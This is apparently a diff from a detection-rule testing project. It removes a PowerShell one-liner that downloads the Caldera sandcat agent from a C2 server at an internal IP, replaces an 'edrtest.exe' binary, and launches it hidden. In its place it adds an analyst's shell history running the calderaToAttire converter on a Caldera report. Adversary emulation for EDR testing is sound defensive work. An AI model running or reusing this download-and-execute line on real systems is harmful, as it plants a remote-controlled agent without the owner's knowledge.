@@ -1,1 +1,18 @@
-$server="http://10.99.156.123:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\edrtest.exe"} | stop-process -f;rm -force "C:\Users\Public\edrtest.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\edrtest.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\edrtest.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+cd RuleTestFramework-main
+   22  ls
+   23  cd Tools/
+   24  ls
+   25  cd calderaToAttire/
+   26  ls
+   27* 
+   28  git clone https://github.com/improsec/calderaToAttire
+   29  sudo git clone https://github.com/improsec/calderaToAttire
+   30  ls
+   31  cd calderaToAttire/
+   32  ls
+   33  cat README.md 
+   34  cp /home/analyst/Downloads/T210.005_report.json .
+   35  sudo cp /home/analyst/Downloads/T210.005_report.json .
+   36  ls
+   37  sudo python3 CalderaToAttire.py T210.005_report.json
+   38  ls
